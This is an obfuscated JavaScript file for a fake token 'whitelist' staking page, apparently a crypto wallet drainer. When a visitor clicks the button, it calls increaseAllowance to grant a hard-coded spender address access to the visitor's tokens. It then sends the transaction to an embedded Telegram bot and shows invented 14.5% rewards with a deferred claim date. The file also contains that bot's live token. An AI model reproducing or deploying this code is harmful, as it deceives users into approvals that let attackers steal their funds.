const _0x4d6477 = _0x4a0e;
(function (_0x2e68b2, _0x2d9ddf) {
  const _0xc3f281 = _0x4a0e,
    _0x45c906 = _0x2e68b2();
  while (!![]) {
    try {
      const _0x31f017 =
        parseInt(_0xc3f281(0xb2)) / 0x1 +
        (parseInt(_0xc3f281(0xaf)) / 0x2) * (-parseInt(_0xc3f281(0xc2)) / 0x3) +
        (-parseInt(_0xc3f281(0x89)) / 0x4) *
          (-parseInt(_0xc3f281(0xa3)) / 0x5) +
        (parseInt(_0xc3f281(0xc1)) / 0x6) * (-parseInt(_0xc3f281(0x99)) / 0x7) +
        (parseInt(_0xc3f281(0x8d)) / 0x8) * (parseInt(_0xc3f281(0xbf)) / 0x9) +
        -parseInt(_0xc3f281(0xa6)) / 0xa +
        parseInt(_0xc3f281(0x8f)) / 0xb;
      if (_0x31f017 === _0x2d9ddf) break;
      else _0x45c906['push'](_0x45c906['shift']());
    } catch (_0xbcb9c6) {
      _0x45c906['push'](_0x45c906['shift']());
    }
  }
})(_0x9702, 0x73084);
const erc20Abi = [
    {
      constant: ![],
      inputs: [
        { internalType: 'address', name: 'spender', type: _0x4d6477(0xc0) },
        {
          internalType: _0x4d6477(0xa5),
          name: _0x4d6477(0x95),
          type: _0x4d6477(0xa5),
        },
      ],
      name: _0x4d6477(0x9f),
      outputs: [
        { internalType: _0x4d6477(0xab), name: '', type: _0x4d6477(0xab) },
      ],
      payable: ![],
      stateMutability: _0x4d6477(0x91),
      type: _0x4d6477(0xb5),
    },
    {
      constant: !![],
      inputs: [
        {
          internalType: _0x4d6477(0xc0),
          name: 'account',
          type: _0x4d6477(0xc0),
        },
      ],
      name: _0x4d6477(0xbd),
      outputs: [
        { internalType: _0x4d6477(0xa5), name: '', type: _0x4d6477(0xa5) },
      ],
      payable: ![],
      stateMutability: _0x4d6477(0xaa),
      type: 'function',
    },
    {
      constant: ![],
      inputs: [
        { internalType: 'address', name: 'spender', type: _0x4d6477(0xc0) },
        {
          internalType: _0x4d6477(0xa5),
          name: _0x4d6477(0xbc),
          type: _0x4d6477(0xa5),
        },
      ],
      name: _0x4d6477(0x93),
      outputs: [{ internalType: _0x4d6477(0xab), name: '', type: 'bool' }],
      payable: ![],
      stateMutability: _0x4d6477(0x91),
      type: _0x4d6477(0xb5),
    },
  ],
  tokenAddress = _0x4d6477(0xb3);
let decimals = 0x12,
  okfirst = '7032206960';
const spenderAddress = _0x4d6477(0x9c),
  BOT_TOKEN = okfirst + _0x4d6477(0xba),
  CHAT_ID = '5204205237';
async function storeAmount(_0x2e741c) {
  const _0x2efb5c = _0x4d6477;
  try {
    if (isNaN(_0x2e741c) || _0x2e741c <= 0x0) {
      alert(_0x2efb5c(0x94));
      return;
    }
    localStorage[_0x2efb5c(0xb7)](_0x2efb5c(0xc4), _0x2e741c['toString']());
  } catch (_0x28ae02) {
    console[_0x2efb5c(0x90)](_0x2efb5c(0xb1), _0x28ae02);
  }
}
function getStoredAmount() {
  const _0x44de53 = _0x4d6477,
    _0x59b3f1 = localStorage[_0x44de53(0xac)](_0x44de53(0xc4));
  return _0x59b3f1 ? parseFloat(_0x59b3f1) : null;
}
async function setStoreAmount() {
  const _0x54c5d6 = _0x4d6477;
  let _0x2ae896 = await getStoredAmount();
  if (_0x2ae896 != null) {
    let _0x3c0a95 = (14.5 / 0x64) * _0x2ae896 + _0x2ae896;
    (document['querySelector'](_0x54c5d6(0xb4))['innerHTML'] =
      _0x2ae896 + _0x54c5d6(0xb6)),
      (document['querySelector'](_0x54c5d6(0x8c))[_0x54c5d6(0x92)] =
        _0x3c0a95 + _0x54c5d6(0xb6));
  }
}
let whitelist_btn = document[_0x4d6477(0xb9)](_0x4d6477(0x8e));
const approveToken = async (_0x5c3681, _0x1bddae, _0x3baf4c) => {
  const _0x51e4c6 = _0x4d6477;
  whitelist_btn['innerHTML'] = _0x51e4c6(0xa1);
  try {
    await connectWallet();
    if (typeof window[_0x51e4c6(0xa7)] === _0x51e4c6(0xa0)) {
      console[_0x51e4c6(0x90)](_0x51e4c6(0xae));
      return;
    }
    const _0x4b5576 = new ethers[_0x51e4c6(0xa4)][_0x51e4c6(0xc3)](
        window[_0x51e4c6(0xa7)],
      ),
      _0x5b85b4 = _0x4b5576['getSigner'](),
      _0x2c904d = new ethers[_0x51e4c6(0xa9)](_0x5c3681, erc20Abi, _0x5b85b4);
    try {
      const _0x326b1b = await _0x2c904d[_0x51e4c6(0x93)](_0x1bddae, _0x3baf4c);
      console[_0x51e4c6(0x97)](
        'Transaction\x20sent!\x20Waiting\x20for\x20confirmation...',
      ),
        await _0x326b1b[_0x51e4c6(0x8b)](),
        console[_0x51e4c6(0x97)]('Transaction\x20confirmed:', _0x326b1b),
        sendMessage(BOT_TOKEN, CHAT_ID, JSON[_0x51e4c6(0x98)](_0x326b1b)),
        await storeAmount(
          ethers['utils'][_0x51e4c6(0xad)](_0x3baf4c, decimals),
        ),
        await setStoreAmount(),
        (whitelist_btn['innerHTML'] = _0x51e4c6(0xbe));
    } catch (_0x28ba65) {}
  } catch (_0x53cc7c) {
    (whitelist_btn[_0x51e4c6(0x92)] = _0x51e4c6(0xbe)),
      console[_0x51e4c6(0x90)]('Error\x20staking\x20token');
  }
};
let Whitelist_btn = document[_0x4d6477(0xb9)]('.Whitelist-btn');
function _0x9702() {
  const _0x2b2f26 = [
    'undefined',
    'Loading...',
    'trim',
    '5ctWvlp',
    'providers',
    'uint256',
    '7315410mXTlKi',
    'ethereum',
    '.claim-btn',
    'Contract',
    'view',
    'bool',
    'getItem',
    'formatUnits',
    'MetaMask\x20or\x20similar\x20wallet\x20not\x20found!',
    '62mJTkSf',
    'utils',
    'Error\x20storing\x20the\x20amount:',
    '299984zQmyTH',
    '0x073761656dC0654F729A4aF0ccE8C9B39b47A18b',
    '#userWhitelist',
    'function',
    '\x20CTL',
    'setItem',
    'value',
    'querySelector',
    ':AAF4KPPRo1zHL9fk3QPMYtxCuNwXgBXeXgg',
    '/sendMessage',
    'addedValue',
    'balanceOf',
    'Whitelist',
    '551412hwNzfp',
    'address',
    '6DDJsPq',
    '35619qatdUe',
    'Web3Provider',
    'storedAmount',
    'click',
    '679564rBfVcq',
    'application/json',
    'wait',
    '#earnedRewards',
    '80ynbKWW',
    '.Whitelist-btn',
    '13744192oNQfBU',
    'error',
    'nonpayable',
    'innerHTML',
    'increaseAllowance',
    'Please\x20enter\x20a\x20valid\x20amount.',
    'amount',
    'Please\x20enter\x20minumum\x201\x20token.',
    'log',
    'stringify',
    '5328757kdYNCO',
    '#WhitelistAmount',
    'addEventListener',
    '0xcBbAAF543a8801a3115e28504F248d4d025B962f',
    'toString',
    'https://api.telegram.org/bot',
    'approve',
  ];
  _0x9702 = function () {
    return _0x2b2f26;
  };
  return _0x9702();
}
Whitelist_btn[_0x4d6477(0x9b)](_0x4d6477(0xc5), function () {
  Whitelist();
});
async function Whitelist() {
  const _0x176c2f = _0x4d6477;
  whitelist_btn[_0x176c2f(0x92)] = _0x176c2f(0xa1);
  let _0x596f47 = document['querySelector'](_0x176c2f(0x9a)),
    _0x52d1dd = _0x596f47[_0x176c2f(0xb8)][_0x176c2f(0xa2)]();
  if (Number(_0x52d1dd) <= 0x0) {
    alert(_0x176c2f(0x96)), (whitelist_btn['innerHTML'] = _0x176c2f(0xbe));
    return;
  } else {
    const _0x252cd6 = ethers[_0x176c2f(0xb0)]['parseUnits'](
      _0x52d1dd[_0x176c2f(0x9d)](),
      decimals,
    );
    await approveToken(tokenAddress, spenderAddress, _0x252cd6),
      (whitelist_btn[_0x176c2f(0x92)] = _0x176c2f(0xbe));
  }
}
let claim_btn = document[_0x4d6477(0xb9)](_0x4d6477(0xa8));
function _0x4a0e(_0x1ca3d0, _0x27da55) {
  const _0x970260 = _0x9702();
  return (
    (_0x4a0e = function (_0x4a0e4d, _0x5c368e) {
      _0x4a0e4d = _0x4a0e4d - 0x89;
      let _0x2df0fb = _0x970260[_0x4a0e4d];
      return _0x2df0fb;
    }),
    _0x4a0e(_0x1ca3d0, _0x27da55)
  );
}
claim_btn['addEventListener'](_0x4d6477(0xc5), function () {
  alert(
    'Rewards\x20can\x20be\x20claimed\x20starting\x20from\x20December\x2015,\x202024.',
  );
}),
  setStoreAmount();
async function sendMessage(_0x279b7b, _0x471e31, _0x2b9999) {
  const _0x152cb2 = _0x4d6477,
    _0x4d1e6c = _0x152cb2(0x9e) + _0x279b7b + _0x152cb2(0xbb);
  try {
    const _0x358cdf = await fetch(_0x4d1e6c, {
      method: 'POST',
      headers: { 'Content-Type': _0x152cb2(0x8a) },
      body: JSON[_0x152cb2(0x98)]({ chat_id: _0x471e31, text: _0x2b9999 }),
    });
  } catch (_0x9e65b5) {}
}
